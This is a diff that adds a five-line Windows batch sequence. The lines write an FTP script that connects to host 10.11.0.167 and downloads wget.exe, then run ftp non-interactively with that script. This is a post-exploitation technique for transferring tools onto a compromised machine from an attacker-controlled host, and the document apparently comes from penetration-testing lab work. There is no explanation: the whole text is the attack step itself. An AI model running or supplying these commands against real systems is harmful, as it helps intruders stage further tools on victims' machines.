@@ -1,0 +1,5 @@
+echo open 10.11.0.167 21 > ftp.txt
+echo binary >> ftp.txt
+echo get wget.exe >> ftp.txt
+echo bye >> ftp.txt
+ftp -v -n -A -s:ftp.txt
